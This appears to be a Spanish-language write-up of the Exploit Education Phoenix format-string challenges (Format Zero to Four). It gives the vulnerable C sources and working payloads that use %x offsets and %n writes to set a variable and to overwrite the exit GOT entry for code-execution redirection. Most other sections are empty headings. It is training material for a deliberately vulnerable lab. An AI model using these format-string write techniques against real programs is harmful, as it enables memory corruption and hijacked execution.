---

layout: default
title: "Phoenix-Exploit Education"
permalink: /Phoenix-EE/
---

# Phoenix-Exploit Education

**Todos los retos de esta pagina se extraen se la siguiente web**

Link: [https://exploit.education/phoenix/](https://exploit.education/phoenix/)

## Índice

  * [Stack Buffer Overflow](#stack-buffer-overflow)
      * [Stack Zero](#stack-zero)
      * [Stack One](#stack-one)
      * [Stack Two](#stack-two)
      * [Stack Three](#stack-three)
      * [Stack Four](#stack-four)
      * [Stack Five](#stack-five)
      * [Stack Six](#stack-six)
  * [Format String Overflow](#format-string-overflow)
      * [Format Zero](#format-zero)
      * [Format One](#format-one)
      * [Format Two](#format-two)
      * [Format Three](#format-three)
      * [Format Four](#format-four)
  * [Heap Overflow](#heap-overflow)
      * [Heap Zero](#heap-zero)
      * [Heap One](#heap-one)
      * [Heap Two](#heap-two)
      * [Heap Three](#heap-three)
  * [Net Overflow](#net-overflow)
      * [Net Zero](#net-zero)
      * [Net One](#net-one)
      * [Net Two](#net-two)
  * [Final Problem](#final-problem)
      * [Final Zero](#final-zero)
      * [Final One](#final-one)
      * [Final Two](#final-two)

# Stack Buffer Overflow

## Stack Zero

## Stack One
## Stack Two
## Stack Three
## Stack Four
## Stack Five
## Stack Six

# Format String Overflow

## Format Zero

```c
/*
 * phoenix/format-zero, by https://exploit.education
 *
 * Can you change the "changeme" variable?
 *
 * 0 bottles of beer on the wall, 0 bottles of beer! You take one down, and
 * pass it around, 4294967295 bottles of beer on the wall!
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

int main(int argc, char **argv) {
  struct {
    char dest[32];
    volatile int changeme;
  } locals;
  char buffer[16];

  printf("%s\n", BANNER);

  if (fgets(buffer, sizeof(buffer) - 1, stdin) == NULL) {
    errx(1, "Unable to get buffer");
  }
  buffer[15] = 0;

  locals.changeme = 0;

  sprintf(locals.dest, buffer);

  if (locals.changeme != 0) {
    puts("Well done, the 'changeme' variable has been changed!");
  } else {
    puts(
        "Uh oh, 'changeme' has not yet been changed. Would you like to try "
        "again?");
  }

  exit(0);
}
```

Como hablamos de formatos, nos referimos a los que tienen **%** como por ejemplo **%s**, **%i**, **%p**, **%x** o **%d** entre otros. En este caso usaremos **%x**, unas cuantas veces para formar el  error del bug.

Como podemos ver, exite una structura llamada **locals**. En el contexto de las estructuras, todos los elementos se ubican de manera continua, para de esta manera no perder tiempo y esfuerzo a la hora de acceder entre ellos. Por ello lo que haremos será exceder todos los 32 bytes del vector de caracteres **dest**, y de esta manera alcanzar al elemento **changeme**.

Ejecutando el siguiente comando:

```bash
user@phoenix-amd64:/opt/phoenix/amd64$ python -c "print '%x'*32"| ./format-zero  
Welcome to phoenix/format-zero, brought to you by https://exploit.education
Well done, the 'changeme' variable has been changed!
```

## Format One

```c
/*
 * phoenix/format-one, by https://exploit.education
 *
 * Can you change the "changeme" variable?
 *
 * Why did the Tomato blush? It saw the salad dressing!
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

int main(int argc, char **argv) {
  struct {
    char dest[32];
    volatile int changeme;
  } locals;
  char buffer[16];

  printf("%s\n", BANNER);

  if (fgets(buffer, sizeof(buffer) - 1, stdin) == NULL) {
    errx(1, "Unable to get buffer");
  }
  buffer[15] = 0;

  locals.changeme = 0;

  sprintf(locals.dest, buffer);

  if (locals.changeme != 0x45764f6c) {
    printf("Uh oh, 'changeme' is not the magic value, it is 0x%08x\n",
        locals.changeme);
  } else {
    puts("Well done, the 'changeme' variable has been changed correctly!");
  }

  exit(0);
}
```

En este nivel, podemos ver que el codigo es muy parecido, solo que esta vez, verifica que el valor de **changeme** no solo cambie, sino que tenga un valor exacto, el cual es **0x45764f6c**. Entonces para esto realizaremos lo mismo pero al final excribiremos el valor hexadecimal deseado.

**Nota: Considere que tendrá que ingresar el valor en modo little endian.**

```bash
user@phoenix-amd64:/opt/phoenix/amd64$ python -c "print '%32x'+'\x6c\x4f\x76\x45'" | ./format-one 
Welcome to phoenix/format-one, brought to you by https://exploit.education
Well done, the 'changeme' variable has been changed correctly!

#Tambien podemos poner en vez de '\x6c\x4f\x76\x45' como '\x45\x76\x4f\x6c'[::-1]

user@phoenix-amd64:/opt/phoenix/amd64$ python -c "print '%32x'+'\x45\x76\x4f\x6c'[::-1]" | ./format-one 
Welcome to phoenix/format-one, brought to you by https://exploit.education
Well done, the 'changeme' variable has been changed correctly!
```

## Format Two

```c
/*
 * phoenix/format-two, by https://exploit.education
 *
 * Can you change the "changeme" variable?
 *
 * What kind of flower should never be put in a vase?
 * A cauliflower.
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

int changeme;

void bounce(char *str) {
  printf(str);
}

int main(int argc, char **argv) {
  char buf[256];

  printf("%s\n", BANNER);

  if (argc > 1) {
    memset(buf, 0, sizeof(buf));
    strncpy(buf, argv[1], sizeof(buf));
    bounce(buf);
  }

  if (changeme != 0) {
    puts("Well done, the 'changeme' variable has been changed correctly!");
  } else {
    puts("Better luck next time!\n");
  }

  exit(0);
}
```

Como podemos ver, ahora no contamos con estructuras, pero nos dicen que tenemos que cambiar el valor de la variable **changeme**. Así que empezaremos con obtener la direccion de memoria de la variable **chageme**, para nuestro programa con el siguiente comando:

```bash
user@phoenix-amd64:~$ nm /opt/phoenix/i486/format-two | grep changeme
08049868 B changeme
```

Ahora escribimos **AAAA** seguido de una cantidad de **%x** para que el utimo numero que salga sea el hexadecimal del primer texto el cual seria el hexadecimal de **AAAA** el cual es **41414141**.

```bash
user@phoenix-amd64:/opt/phoenix/amd64$ /opt/phoenix/i486/format-two $(python -c "print 'AAAA'+'%x.'*12")
Welcome to phoenix/format-two, brought to you by https://exploit.education
AAAAffffd89d.100.0.f7f84b67.ffffd700.ffffd6e8.80485a0.ffffd5e0.ffffd89d.100.3e8.41414141.Better luck next time!
```

Entonces lo que haremos será quitar un **%x** y reemplazarlo por un **%n** y veremos lo que ocurre:

```bash
user@phoenix-amd64:/opt/phoenix/amd64$ /opt/phoenix/i486/format-two $(python -c "print 'AAAA'+'%x.'*11+'%n'")
Welcome to phoenix/format-two, brought to you by https://exploit.education
Segmentation fault
```

Entonces como puede ver, nos encontramos con un **Segmentation fault**, lo cual nos dice que se ha encontrado una direccion invalida de memoria. Esto se debe a que esta intentando sobrescribir en la direccion **0x41414141** pero esta direccion es inválida. Entonces lo que haremos será insertar la direccion de memoria de la variable **changeme** (en modo little endian).

```bash
user@phoenix-amd64:/opt/phoenix/amd64$ /opt/phoenix/i486/format-two $(python -c "print '\x08\x04\x98\x68'[::-1]+'%x.'*11+'%n'")
Welcome to phoenix/format-two, brought to you by https://exploit.education
hffffd89e.100.0.f7f84b67.ffffd700.ffffd6e8.80485a0.ffffd5e0.ffffd89e.100.3e8.Well done, the 'changeme' variable has been changed correctly!
```

Y como podemos ver, logramos sobrescribir el contenido de la variable **changeme**.

## Format Three

```c
/*
 * phoenix/format-three, by https://exploit.education
 *
 * Can you change the "changeme" variable to a precise value?
 *
 * How do you fix a cracked pumpkin? With a pumpkin patch.
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

int changeme;

void bounce(char *str) {
  printf(str);
}

int main(int argc, char **argv) {
  char buf[4096];
  printf("%s\n", BANNER);

  if (read(0, buf, sizeof(buf) - 1) <= 0) {
    exit(EXIT_FAILURE);
  }

  bounce(buf);

  if (changeme == 0x64457845) {
    puts("Well done, the 'changeme' variable has been changed correctly!");
  } else {
    printf(
        "Better luck next time - got 0x%08x, wanted 0x64457845!\n", changeme);
  }

  exit(0);
}
```

Este nivel es parecido al anterior, solo que ahora nos piden que sobrescribamos la variable **changeme** con un valor en especifico. Así que empezaremos con obtener la direccion de la variable **changeme** y luego vemos cuantos **%x** hay que agregar para que salgan nuestras **AAAA**.

```bash
user@phoenix-amd64:/opt/phoenix/i486$ nm ./format-three | grep changeme
08049844 B changeme

user@phoenix-amd64:/opt/phoenix/i486$ python -c "print 'AAAA'+'%x '*12" |./format-three 
Welcome to phoenix/format-three, brought to you by https://exploit.education
AAAA0 0 0 f7f81cf7 f7ffb000 ffffd738 8048556 ffffc730 ffffc730 fff 0 41414141 
Better luck next time - got 0x00000000, wanted 0x64457845!
```

Ahora restamos un **%x** y lo reemplazamos por un **%n**. Tambien a su vez cambiamos las **AAAA** por la direccion de memoria de donde apunta nuestra variable **changeme** (en modo little endian).

```bash
user@phoenix-amd64:/opt/phoenix/i486$ python -c "print '\x08\x04\x98\x44'[::-1]+'%x '*12" |./format-three 
Welcome to phoenix/format-three, brought to you by https://exploit.education
D0 0 0 f7f81cf7 f7ffb000 ffffd738 8048556 ffffc730 ffffc730 fff 0 8049844 
Better luck next time - got 0x00000000, wanted 0x64457845!

user@phoenix-amd64:/opt/phoenix/i486$ python -c "print '\x08\x04\x98\x44'[::-1]+'%x '*11+'%n'" |./format-three 
Welcome to phoenix/format-three, brought to you by https://exploit.education
D0 0 0 f7f81cf7 f7ffb000 ffffd738 8048556 ffffc730 ffffc730 fff 0 
Better luck next time - got 0x00000045, wanted 0x64457845!
```

Como podemos ver, hemos escrito en el byte primero pero, nos faltan 3 bytes mas. Entonces ingresaremos en la parte de adelante las otras direcciones (de los siguientes 3 bytes) para ver cual es el resultado.

```bash
user@phoenix-amd64:/opt/phoenix/i486$ python -c "print '\x08\x04\x98\x44'[::-1]+'\x08\x04\x98\x45'[::-1]+'\x08\x04\x98\x46'[::-1]+'\x08\x04\x98\x47'[::-1]+'%x '*11+'%n'" |./format-three 
Welcome to phoenix/format-three, brought to you by https://exploit.education
DEFG0 0 0 f7f81cf7 f7ffb000 ffffd738 8048556 ffffc730 ffffc730 fff 0 
Better luck next time - got 0x00000051, wanted 0x64457845!
```

Como podemos ver, se a desplazado los bytes, por ello, lo que haremos será usar esta informacion para desplazar caracteres usando **A**. Haciendo un pequeño calculo, necesitamos saber cuantas **A** se necesita agregar para que 45 llegue a 51, entonces hariamos una pequeña resta de 45-51, pero como esto nos da una resta negativa entonces no tenemos que hacer exactamente esta resta, notamos que si sobrepasa el byte no nos importa puesto que eso podemos arreglarlo en el siguiente byte. Entonces haremos la resta de 145-51 (considerando que son numeros en hexadecimal).

```bash
>>> int("145",16)-int("51",16) #Codigo en consola de python
244

user@phoenix-amd64:/opt/phoenix/i486$ python -c "print '\x08\x04\x98\x44'[::-1]+'\x08\x04\x98\x45'[::-1]+'\x08\x04\x98\x46'[::-1]+'\x08\x04\x98\x47'[::-1]+'%x '*11+'A'*244+'%n'" |./format-three 
Welcome to phoenix/format-three, brought to you by https://exploit.education
DEFG0 0 0 f7f81cf7 f7ffb000 ffffd738 8048556 ffffc730 ffffc730 fff 0 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Better luck next time - got 0x00000145, wanted 0x64457845!
```

Luego agregamos el siguiente %n para ver, como se encuentra nuestro segundo byte al sobrescribir.

```bash
user@phoenix-amd64:/opt/phoenix/i486$ python -c "print '\x08\x04\x98\x44'[::-1]+'\x08\x04\x98\x45'[::-1]+'\x08\x04\x98\x46'[::-1]+'\x08\x04\x98\x47'[::-1]+'%x '*11+'A'*244+'%n'+'%n'" |./format-three 
Welcome to phoenix/format-three, brought to you by https://exploit.education
DEFG0 0 0 f7f81cf7 f7ffb000 ffffd738 8048556 ffffc730 ffffc730 fff 0 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Better luck next time - got 0x00014545, wanted 0x64457845!
```

Ahora, realizamos lo mismo con el siguiente byte, lo cual seria 78-45.

```bash
>>> int("78",16)-int("45",16)
51

user@phoenix-amd64:/opt/phoenix/i486$ python -c "print '\x08\x04\x98\x44'[::-1]+'\x08\x04\x98\x45'[::-1]+'\x08\x04\x98\x46'[::-1]+'\x08\x04\x98\x47'[::-1]+'%x '*11+'A'*244+'%n'+'A'*51+'%n'" |./format-three 
Welcome to phoenix/format-three, brought to you by https://exploit.education
DEFG0 0 0 f7f81cf7 f7ffb000 ffffd738 8048556 ffffc730 ffffc730 fff 0 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Better luck next time - got 0x00017845, wanted 0x64457845!
```

Y volvemos a hacer lo mismo para el siguiente byte.

```bash
user@phoenix-amd64:/opt/phoenix/i486$ python -c "print '\x08\x04\x98\x44'[::-1]+'\x08\x04\x98\x45'[::-1]+'\x08\x04\x98\x46'[::-1]+'\x08\x04\x98\x47'[::-1]+'%x '*11+'A'*244+'%n'+'A'*51+'%n'+'%n'" |./format-three 
Welcome to phoenix/format-three, brought to you by https://exploit.education
DEFG0 0 0 f7f81cf7 f7ffb000 ffffd738 8048556 ffffc730 ffffc730 fff 0 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Better luck next time - got 0x01787845, wanted 0x64457845!

>>> int("145",16)-int("78",16)
205

user@phoenix-amd64:/opt/phoenix/i486$ python -c "print '\x08\x04\x98\x44'[::-1]+'\x08\x04\x98\x45'[::-1]+'\x08\x04\x98\x46'[::-1]+'\x08\x04\x98\x47'[::-1]+'%x '*11+'A'*244+'%n'+'A'*51+'%n'+'A'*205+'%n'" |./format-three 
Welcome to phoenix/format-three, brought to you by https://exploit.education
DEFG0 0 0 f7f81cf7 f7ffb000 ffffd738 8048556 ffffc730 ffffc730 fff 0 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Better luck next time - got 0x02457845, wanted 0x64457845!
```

Y para el ultimo byte.

```bash
user@phoenix-amd64:/opt/phoenix/i486$ python -c "print '\x08\x04\x98\x44'[::-1]+'\x08\x04\x98\x45'[::-1]+'\x08\x04\x98\x46'[::-1]+'\x08\x04\x98\x47'[::-1]+'%x '*11+'A'*244+'%n'+'A'*51+'%n'+'A'*205+'%n'+'%n'" |./format-three 
Welcome to phoenix/format-three, brought to you by https://exploit.education
DEFG0 0 0 f7f81cf7 f7ffb000 ffffd738 8048556 ffffc730 ffffc730 fff 0 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Better luck next time - got 0x45457845, wanted 0x64457845!

>>> int("64",16)-int("45",16)
31

user@phoenix-amd64:/opt/phoenix/i486$ python -c "print '\x08\x04\x98\x44'[::-1]+'\x08\x04\x98\x45'[::-1]+'\x08\x04\x98\x46'[::-1]+'\x08\x04\x98\x47'[::-1]+'%x '*11+'A'*244+'%n'+'A'*51+'%n'+'A'*205+'%n'+'A'*31+'%n'" |./format-three 
Welcome to phoenix/format-three, brought to you by https://exploit.education
DEFG0 0 0 f7f81cf7 f7ffb000 ffffd738 8048556 ffffc730 ffffc730 fff 0 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Well done, the 'changeme' variable has been changed correctly!
```

## Format Four

```c
/*
 * phoenix/format-four, by https://exploit.education
 *
 * Can you affect code execution? Once you've got congratulations() to
 * execute, can you then execute your own shell code?
 *
 * Did you get a hair cut?
 * No, I got all of them cut.
 *
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

void bounce(char *str) {
  printf(str);
  exit(0);
}

void congratulations() {
  printf("Well done, you're redirected code execution!\n");
  exit(0);
}

int main(int argc, char **argv) {
  char buf[4096];

  printf("%s\n", BANNER);

  if (read(0, buf, sizeof(buf) - 1) <= 0) {
    exit(EXIT_FAILURE);
  }

  bounce(buf);
}
```

Obteniendo las direcciones utiles.

```bash
user@phoenix-amd64:/opt/phoenix/i486$ nm ./format-four | grep congrat
08048503 T congratulations

user@phoenix-amd64:/opt/phoenix/i486$ objdump -R ./format-four | grep exit
080497e4 R_386_JUMP_SLOT   exit -> 51515151
```

Como en el ejemplo anterior, llenaremos de **%x**, para verificar si encontramos los hexadecimales de las **AAAA**.

```bash
user@phoenix-amd64:/opt/phoenix/i486$ python -c "print 'AAAA'+'%x '*12" |./format-four
Welcome to phoenix/format-four, brought to you by https://exploit.education
AAAA0 0 0 f7f81cf7 f7ffb000 ffffd738 804857d ffffc730 ffffc730 fff 0 41414141
```

  Como ya vimos en el **Format Three**, manejaremos un archivo llamado script.py en el directorio /tmp. Y empezaremos escribiendo el script con los valores que ya obtuvimos.

```python
#!/bin/python

buf ='\x08\x04\x97\xe4'[::-1]
buf+='\x08\x04\x97\xe5'[::-1]
buf+='\x08\x04\x97\xe6'[::-1]
buf+='\x08\x04\x97\xe7'[::-1]
buf+='%x '*11
buf+='A'*0+'%n'
buf+='A'*0+'%n'
buf+='A'*0+'%n'
buf+='A'*0+'%n'

print(buf)
```

Y luego lo que haremos será usar el gdb.

```bash
user@phoenix-amd64:/opt/phoenix/i486$ gdb -q ./format-four 

#Luego ejecutamos el siguiente comando en la consola de gdb
(gdb) run < <(python /tmp/script.py)

#Podemos ver que el programa se paró y en el registro eip obtenemos lo siguiente.
$eip   : 0x51515151 ("QQQQ"?)
```

Nosotros queremos que el $eip apunte a: **08048503**. Entonces haremos lo mismo que en el ejemplo anterior.

```bash
>>> int("103",16)-int("51",16)
178

$ cat /tmp/script.py

#!/bin/python

buf ='\x08\x04\x97\xe4'[::-1]
buf+='\x08\x04\x97\xe5'[::-1]
buf+='\x08\x04\x97\xe6'[::-1]
buf+='\x08\x04\x97\xe7'[::-1]
buf+='%x '*11
buf+='A'*178+'%n'
buf+='A'*0+'%n'
buf+='A'*0+'%n'
buf+='A'*0+'%n'

print(buf)

$eip   : 0x3030303
```

Y de la misma manera para los demas bytes.

```
#Para el segundo byte
>>> int("85",16)-int("03",16)
130
#Ejecutando el GDB de nuevo
$eip   : 0x85858503
#Lo que queremos
$eip   : 0x08048503

#Para el tercer byte
>>> int("104",16)-int("85",16)
127
#Ejecutando el GDB de nuevo
$eip   : 0x4048503
#Lo que queremos
$eip   : 0x08048503

#Para el cuarto y ultimo byte
>>> int("08",16)-int("04",16)
4
#Ejecutando el GDB de nuevo
Well done, you're redirected code execution!
Well done, you're redirected code execution!
Well done, you're redirected code execution!
Well done, you're redirected code execution!
Well done, you're redirected code execution!
Well done, you're redirected code execution!
Well done, you're redirected code execution!
Well done, you're redirected code execution!
...
```

# Heap Overflow

## Heap Zero

## Heap One
## Heap Two
## Heap Three
# Net Overflow

## Net Zero

## Net One
## Net Two

# Final Problem

## Final Zero
## Final One
## Final Two

